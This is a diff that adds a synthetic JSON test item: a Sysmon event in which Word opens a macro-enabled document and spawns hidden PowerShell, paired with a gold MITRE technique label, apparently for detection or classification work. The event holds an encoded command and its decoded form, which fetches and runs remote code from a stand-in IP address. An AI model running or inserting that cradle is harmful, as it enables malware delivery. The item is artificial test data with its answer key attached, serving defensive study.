@@ -1,0 +1,20 @@
+{
+  "id": "example-03-office-powershell",
+  "title": "Sysmon: Word spawned hidden PowerShell with an encoded command",
+  "platform": "Windows",
+  "log_sources": [{"name": "WinEventLog:Sysmon", "channel": "EventCode=1"}],
+  "content": {
+    "EventID": 1,
+    "UtcTime": "2026-11-05 07:42:18.311",
+    "Computer": "FIN-WS-0231.corp.example",
+    "User": "CORP\\j.doe",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\j.doe\\Downloads\\Payment_Advice_0411.docm\"",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhACcAKQA=",
+    "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')",
+    "IntegrityLevel": "Medium"
+  },
+  "gold": ["T1059.001"],
+  "meta": {"synthetic": true, "note": "Written for this demo; no real organisation's data."}
+}
